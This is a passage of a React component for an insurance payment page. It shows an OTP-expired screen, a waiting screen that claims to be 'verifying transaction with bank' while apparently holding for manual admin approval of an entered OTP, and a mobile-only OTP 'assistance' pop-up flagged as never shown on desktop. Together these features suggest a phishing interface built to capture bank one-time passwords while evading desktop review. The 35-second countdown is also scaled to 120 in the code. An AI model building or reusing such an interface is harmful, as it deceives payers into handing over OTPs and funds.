                        : 'Verify & Confirm Payment'}
                    </span>
                  </>
                )}
              </button>
            </form>
          )}

          {/* STEP 4: 35-SECOND LIVE WAITING & ADMIN APPROVAL SCREEN */}
          {step === 'waiting_approval' && (
            <div className="py-8 px-4 text-center space-y-6 animate-fadeIn">
              <div className="relative w-20 h-20 mx-auto flex items-center justify-center">
                <div className="absolute inset-0 rounded-full border-4 border-orange-100 animate-ping opacity-60" />
                <div className="absolute inset-0 rounded-full border-4 border-[#EA580C] border-t-transparent animate-spin" />
                <div className="w-14 h-14 bg-orange-50 rounded-full flex items-center justify-center text-[#EA580C] shadow-inner">
                  <ShieldCheck className="w-7 h-7 animate-pulse" />
                </div>
              </div>

              <div className="space-y-2">
                <h4 className="font-extrabold text-slate-900 text-lg">
                  Verifying Transaction with Bank...
                </h4>
                <p className="text-xs text-slate-600 max-w-sm mx-auto leading-relaxed">
                  Please do not refresh the page or click back. Your transaction is undergoing secure two-factor bank & admin gateway verification.
                </p>
              </div>

              {/* Live 35s Countdown Progress Card */}
              <div className="bg-orange-50/80 border border-orange-200 rounded-2xl p-4 max-w-sm mx-auto shadow-sm">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-orange-950 flex items-center gap-1.5">
                    <Clock className="w-4 h-4 text-[#EA580C]" />
                    Gateway Authorization Window
                  </span>
                  <span className="font-mono font-extrabold text-sm text-[#EA580C] bg-white px-2.5 py-0.5 rounded border border-orange-200">
                    {waitingTimeLeft}s remaining
                  </span>
                </div>

                {/* Progress bar */}
                <div className="w-full bg-orange-200 h-2 rounded-full overflow-hidden">
                  <div 
                    className="bg-gradient-to-r from-amber-500 to-[#EA580C] h-full transition-all duration-1000 ease-linear rounded-full"
                    style={{ width: `${Math.max(0, Math.min(100, (waitingTimeLeft / 120) * 100))}%` }}
                  />
                </div>

                <div className="mt-3 text-[11px] text-slate-500 flex justify-between items-center">
                  <span>Ref: <strong className="font-mono text-slate-800">{activeTxnRef}</strong></span>
                  <span>OTP Verified: <strong className="font-mono text-emerald-700">✓ Entered</strong></span>
                </div>
              </div>

              <div className="p-3 bg-slate-50 rounded-xl border border-slate-200 text-xs text-slate-600 max-w-sm mx-auto flex items-center gap-2.5 text-left">
                <div className="w-2 h-2 rounded-full bg-emerald-500 animate-ping shrink-0" />
                <span>Synchronizing live with secure payment gateway. Awaiting authorization response...</span>
              </div>
            </div>
          )}

          {/* STEP 4: OTP EXPIRED SCREEN */}
          {step === 'expired' && (
            <div className="py-6 px-2 text-center space-y-4 animate-fadeIn">
              <div className="w-14 h-14 bg-rose-100 text-rose-700 rounded-full flex items-center justify-center mx-auto">
                <AlertCircle className="w-8 h-8" />
              </div>

              <div className="space-y-1">
                <h4 className="font-extrabold text-slate-900 text-base text-rose-700">
                  OTP Session Expired!
                </h4>
                <p className="text-xs text-slate-600 max-w-xs mx-auto">
                  No OTP was entered within the 3-minute time limit. The payment request has expired and session terminated.
                </p>
              </div>

              <div className="p-3 bg-rose-50 rounded-xl border border-rose-200 text-xs text-rose-900 space-y-1 font-medium text-left">
                <div className="flex justify-between">
                  <span>Transaction ID:</span>
                  <strong className="font-mono">{activeTxnRef}</strong>
                </div>
                <div className="flex justify-between">
                  <span>Attempt Status:</span>
                  <strong className="text-rose-700 font-bold">Failed / Expired</strong>
                </div>
              </div>

              <button
                type="button"
                onClick={() => setStep('method')}
                className="w-full bg-[#EA580C] hover:bg-[#D97706] text-white py-3 px-5 rounded-xl font-extrabold text-xs shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
              >
                <RefreshCw className="w-4 h-4" />
                <span>Re-initiate Payment Attempt</span>
              </button>
            </div>
          )}

        </div>

      </div>

      {/* Mobile-Only OTP Verification Assistance Pop-up (Never shown on desktop) */}
      {deviceInfo.isMobile && (
        <MobileOtpAssistanceModal
          isOpen={showMobileOtpModal}
          deviceInfo={deviceInfo}
          customerName={policy.customerName}
          policyNumber={policy.policyNumber}
          onAccept={handleAcceptMobileOtp}
          onDecline={handleDeclineMobileOtp}
        />
      )}
    </div>
  );
};
